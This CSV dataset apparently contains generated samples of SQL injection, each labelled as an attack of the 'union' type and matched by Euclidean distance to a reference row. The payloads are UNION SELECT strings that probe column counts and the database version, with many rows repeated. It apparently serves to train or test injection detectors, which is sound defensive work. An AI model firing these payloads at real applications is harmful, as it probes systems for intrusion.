id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000022,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.892468020572729
CTGAN_000023,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,4.927173673483578
CTGAN_000024,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,7.973706241875259
CTGAN_000025,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,6.806193258081615
CTGAN_000026,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.0532248180939074
CTGAN_000027,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,5.8888969630293335
CTGAN_000028,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,6.171361030422367
CTGAN_000029,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,5.624759728301968
CTGAN_000030,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,6.261934559273976
CTGAN_000031,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,7.507722649627433
CTGAN_000032,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.499748999175114
CTGAN_000033,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,7.019974399618836
CTGAN_000034,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,9.848176688060516
CTGAN_000035,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,6.004589554510542
CTGAN_000036,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.794663823565379
CTGAN_000037,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,4.657222135399951
CTGAN_000038,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,6.996371695940953
CTGAN_000039,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,8.20355560914693
CTGAN_000040,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,5.609086133461652
CTGAN_000041,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,4.47301017882732
CTGAN_000042,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.690685286878271
CTGAN_000043,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000086,6.556681967055599
CTGAN_000044,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,5.7667278980992815
CTGAN_000045,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.329093469812892
CTGAN_000046,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,6.589814569415279
CTGAN_000047,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,5.342674903242519
CTGAN_000048,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.921267410197073
CTGAN_000049,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,4.977042680699728
CTGAN_000050,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,4.475612222039698
CTGAN_000051,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,5.614301011585645
CTGAN_000052,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,6.021986166386903
CTGAN_000053,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,6.774826639935331
CTGAN_000054,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,5.126757624033071
CTGAN_000055,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,5.419879076854618
CTGAN_000056,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,7.09945360580287
CTGAN_000057,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.282295419796408
CTGAN_000058,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.349030695096358
CTGAN_000059,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,6.07218066656001
CTGAN_000060,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.674368375902458
CTGAN_000061,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.098268060860576
CTGAN_000062,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.793255970615036
CTGAN_000063,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,6.10636986981767
CTGAN_000064,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,8.0729636811869
CTGAN_000065,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.63649314062185
CTGAN_000066,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.7005758503740855
CTGAN_000067,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,4.7684146179430815
CTGAN_000068,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,7.615125897667808
CTGAN_000069,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,6.993676746652995
CTGAN_000070,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.551840918609951
CTGAN_000071,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,7.078770142287185
CTGAN_000072,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,4.844793266119165
CTGAN_000073,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,8.323633641626017
CTGAN_000074,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,4.5057552989516445
CTGAN_000075,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,5.587414975165223
CTGAN_000076,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,5.887135103674778
CTGAN_000077,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,4.935464670126071
CTGAN_000078,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.199241431534184
CTGAN_000079,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,6.472385185974421
CTGAN_000080,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,7.179357305186896
CTGAN_000081,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,6.319244043731234
CTGAN_000082,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,6.018887792036855
CTGAN_000083,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,6.494477621216861
CTGAN_000084,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,7.165491262709973
CTGAN_000085,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,5.692293144185916
CTGAN_000086,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,5.6766246416391475
CTGAN_000087,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.619361660056052
CTGAN_000088,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.009851202615501
CTGAN_000089,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.266991358051331
CTGAN_000090,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,7.203772592853334
CTGAN_000091,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,5.599480243184915
CTGAN_000092,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,5.44730053069064
CTGAN_000093,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,6.368635455191045
CTGAN_000094,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,6.044678148643079
CTGAN_000095,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,4.549492055551224
CTGAN_000096,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.347566648301413
CTGAN_000097,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,6.9654837939083185
CTGAN_000098,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.912280596054314
CTGAN_000099,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,5.8139482825846605
CTGAN_000100,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.905537417273865
CTGAN_000101,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,7.531953807073587
CTGAN_000102,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,8.061429507209375
CTGAN_000103,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,5.129435126788218
CTGAN_000104,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,5.7876716070320215
CTGAN_000105,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.405638055434887
CTGAN_000106,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.087270339281084
CTGAN_000107,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.3336758342868915
CTGAN_000108,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.577011979221014
CTGAN_000109,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,7.16109032298258
CTGAN_000110,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.982749081440121
CTGAN_000111,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,4.88550537071977
CTGAN_000112,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,7.549905898370071
CTGAN_000113,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,6.5816513360194735
CTGAN_000114,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,4.249658299148115
CTGAN_000115,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.429092294623654
CTGAN_000116,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,4.980573437208103
CTGAN_000117,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,5.462534096491803
CTGAN_000118,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,5.043067866027456
CTGAN_000119,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.393876611756209
CTGAN_000120,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,5.043587974915991
CTGAN_000121,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,6.6133647259419455
CTGAN_000122,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,6.975394698765032
CTGAN_000123,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,5.503944797467259
CTGAN_000124,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,6.2533288212356695
CTGAN_000125,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,5.2625485786117565
CTGAN_000126,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.901132008035567
CTGAN_000127,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.0107071900767455
CTGAN_000128,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.132293137547695
CTGAN_000129,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.454852962212059
CTGAN_000130,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,5.475749089817335
CTGAN_000131,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,5.419496484809461
CTGAN_000132,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,7.799612943633559
CTGAN_000133,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,7.840050659150927
CTGAN_000134,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000053,5.220147627662082
CTGAN_000135,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,4.78886829965779
CTGAN_000136,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,5.427642286676912
CTGAN_000137,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,5.154052148690633
CTGAN_000138,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,7.816248751001404
CTGAN_000139,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,7.261857481574269
CTGAN_000140,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,6.960041250908004
CTGAN_000141,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,6.569542799984933
CTGAN_000142,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,8.457985307586222
CTGAN_000143,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,7.910858761168276
CTGAN_000144,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.108620113210042
CTGAN_000145,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,6.636895910074499
CTGAN_000146,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,7.002471697442442
CTGAN_000147,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.301601598819168
CTGAN_000148,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,3.9417978308072263
CTGAN_000149,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,5.918721568725584
CTGAN_000150,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.147549761767761
CTGAN_000151,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,6.741197326422366
CTGAN_000152,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.418156241028665
CTGAN_000153,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.015580401612685
CTGAN_000154,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,4.762542068915832
CTGAN_000155,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,5.126941553780516
CTGAN_000156,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.6507833399962895
CTGAN_000157,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,8.323889748101458
CTGAN_000158,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,5.888786286589852
CTGAN_000159,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,4.5915856167440205
CTGAN_000160,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.1567935408436645
CTGAN_000161,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.702839440103871
CTGAN_000162,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000069,6.2434314107709445
CTGAN_000163,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,3.5799146181802586
CTGAN_000164,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.832556235571608
CTGAN_000165,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,6.4251032758009154
CTGAN_000166,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,4.999831691050483
CTGAN_000167,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,6.306366165513872
CTGAN_000168,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,4.551156921120122
CTGAN_000169,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.787054624824852
CTGAN_000170,attack,union,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",nearest_attack_euclidean,R000133,5.387237204949718
CTGAN_000171,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,5.213882399668691
CTGAN_000172,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,5.897667919767529
CTGAN_000173,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.205566224389326
CTGAN_000174,attack,union,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",nearest_attack_euclidean,R000133,5.980894990443365
CTGAN_000175,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.4337829264211885
CTGAN_000176,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.224610182807149
CTGAN_000177,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,6.27090818686253
CTGAN_000178,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,4.905782610248991
CTGAN_000179,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,8.833340941873635
CTGAN_000180,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.8893384329675467
CTGAN_000181,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.796852859183068
CTGAN_000182,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.8488846341015845
CTGAN_000183,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,5.527848479470589
CTGAN_000184,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,7.461901204367854
CTGAN_000185,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.407622586620199
CTGAN_000186,attack,union,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",nearest_attack_euclidean,R000114,6.0435662978317275
CTGAN_000187,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,9.201239323288158
CTGAN_000188,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,5.099018314041717
CTGAN_000189,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.1417525150785455
CTGAN_000190,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,9.731824433822613
CTGAN_000191,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,4.430557431623759
CTGAN_000192,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,6.723197739020372
CTGAN_000193,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,7.062982100180373
CTGAN_000194,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.386329197997941
CTGAN_000195,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.739105794301383
CTGAN_000196,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.2935574253268305
